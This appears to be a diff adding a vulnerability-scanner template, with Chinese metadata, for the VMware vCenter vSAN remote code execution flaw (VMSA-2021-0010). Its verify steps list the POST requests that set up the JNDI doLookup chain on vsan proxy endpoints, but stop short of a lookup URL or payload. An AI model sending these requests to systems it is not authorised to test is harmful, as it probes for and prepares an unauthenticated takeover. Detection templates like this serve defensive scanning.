@@ -1,0 +1,74 @@
+app: VMware-vCenter
+query: app:"VMware-vCenter"
+meta:
+  name: VMware vCenter远程代码执行漏洞
+  level: 5
+  tags:
+    - remote_code_execution
+    - ultra_vires
+  description: 该漏洞是由于Virtual SAN缺少输入验证，vSphere Client（HTML5）包含一个远程执行代码漏洞，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行远程代码执行，最终可获取服务器最高权限。
+  homepage: https://www.vmware.com/products/vcenter-server.html
+  author: 一曲成殇
+  references: https://www.linuxlz.com/aqld/2293.html
+  solution: 当前官方已发布受影响版本的对应补丁，建议受影响的用户及时更新官方的安全补丁。链接如下：https://www.vmware.com/security/advisories/VMSA-2021-0010.html
+  steps:
+    verify_steps:
+      type: or
+      verify:
+        - request:
+            method: POST
+            path: /ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData
+            redirect: false
+            header:
+              - content-type: application/json;charset=UTF-8
+            params: '{"methodInput":[{"type":"ClusterComputeResource","value": null,"serverGuid":
+              null}]}'
+          response:
+            - name: body
+              value: '"result":'
+              type: contains
+            - name: code
+              value: "200"
+              type: equals
+        - request:
+            method: POST
+            path: /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setStaticMethod
+            redirect: false
+            header:
+              - content-type: application/json;charset=UTF-8
+            params: '{"methodInput":["javax.naming.InitialContext.doLookup"]}'
+          response:
+            - name: body
+              value: '"result":'
+              type: contains
+            - name: code
+              value: "200"
+              type: equals
+        - request:
+            method: POST
+            path: /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/setTargetMethod
+            redirect: true
+            header:
+              - content-type: application/json;charset=UTF-8
+            params: '{"methodInput":["doLookup"]}'
+          response:
+            - name: code
+              value: "200"
+              type: equals
+            - name: body
+              value: '"result":'
+              type: contains
+        - request:
+            method: POST
+            path: /ui/h5-vsan/rest/proxy/service/&vsanQueryUtil_setDataService/prepare
+            redirect: true
+            header: [ ]
+            params: '{"methodInput":[]}'
+          response:
+            - name: code
+              value: "200"
+              type: equals
+            - name: body
+              value: '"result":'
+              type: contains
+  create_at: "2021-11-08 14:56:26"
